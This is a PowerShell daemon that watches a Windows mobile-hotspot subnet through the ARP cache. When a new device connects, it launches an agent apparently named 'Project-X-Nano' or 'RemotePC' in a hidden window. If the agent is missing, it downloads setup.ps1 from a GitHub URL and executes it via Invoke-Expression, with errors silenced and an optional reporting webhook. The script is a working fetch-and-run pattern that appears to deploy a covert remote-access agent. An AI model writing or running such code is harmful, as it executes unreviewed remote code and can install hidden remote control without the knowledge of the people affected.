<#
.SYNOPSIS
    Project-X-Nano Mobile Hotspot Auto-Installer Daemon
.DESCRIPTION
    Continuously monitors the Windows Mobile Hotspot ICS subnet (192.168.137.0/24)
    using the ARP cache. When a new mobile device connects, it triggers setup.ps1
    with RunLevel Highest or starts the agent if already installed.
#>

[CmdletBinding()]
param(
    [string]$WebhookUrl = ""
)

$ErrorActionPreference = "SilentlyContinue"

$LogDir = "$env:ProgramData\Project-X-Nano"
if (-not (Test-Path $LogDir)) {
    New-Item -ItemType Directory -Path $LogDir -Force | Out-Null
}
$LogFile = Join-Path $LogDir "hotspot-trigger.log"

function Write-Log {
    param([string]$Message)
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$ts] $Message"
    Add-Content -Path $LogFile -Value $line -Encoding UTF8
    Write-Output $line
}

Write-Log "=========================================================="
Write-Log "[*] Project-X-Nano Hotspot Auto-Installer Daemon Started."
Write-Log "[*] Monitoring ICS subnet 192.168.137.0/24 for connected devices..."
if ($WebhookUrl) {
    Write-Log "[*] Notification Webhook configured: $WebhookUrl"
}

$KnownMacs = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
$AgentPath = "$env:LOCALAPPDATA\Project-X-Nano\Project-X-Nano.exe"

while ($true) {
    try {
        # Check arp cache for 192.168.137.x entries
        $arpOutput = arp -a | Select-String "192\.168\.137\."

        foreach ($line in $arpOutput) {
            $parts = ($line.ToString().Trim() -split '\s+')
            if ($parts.Count -ge 2) {
                $ip = $parts[0]
                $mac = $parts[1]

                # Ignore broadcast or gateway entries
                if ($ip -eq "192.168.137.1" -or $ip -eq "192.168.137.255" -or $mac -eq "ff-ff-ff-ff-ff-ff") {
                    continue
                }

                if (-not $KnownMacs.Contains($mac)) {
                    $KnownMacs.Add($mac) | Out-Null
                    Write-Log "[!] NEW HOTSPOT CLIENT DETECTED: IP=$ip | MAC=$mac"

                    # Check if agent is already installed and running
                    $isRunning = Get-Process -Name "Project-X-Nano", "RemotePC" -ErrorAction SilentlyContinue

                    if (-not $isRunning) {
                        if (Test-Path $AgentPath) {
                            Write-Log "[+] Agent executable found at $AgentPath. Launching process..."
                            Start-Process -FilePath $AgentPath -WorkingDirectory (Split-Path $AgentPath) -ArgumentList "--forward" -WindowStyle Hidden
                        } else {
                            Write-Log "[*] Agent not found locally. Running setup.ps1 installer..."
                            $setupUrl = "https://raw.githubusercontent.com/mexxz-01/Project-x-alpha/main/setup.ps1"
                            if ($WebhookUrl) {
                                [System.Environment]::SetEnvironmentVariable("PXN_REPORT_URL", $WebhookUrl, "Process")
                            }
                            try {
                                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                                Invoke-Expression (Invoke-RestMethod -Uri $setupUrl -UseBasicParsing)
                                Write-Log "[+] setup.ps1 executed successfully via hotspot trigger."
                            } catch {
                                Write-Log "[-] Error downloading or running setup.ps1: $_"
                            }
                        }
                    } else {
                        Write-Log "[+] Agent is already active and running (PID: $($isRunning[0].Id))."
                    }
                }
            }
        }
    } catch {
        Write-Log "[-] Polling loop warning: $_"
    }

    Start-Sleep -Seconds 5
}
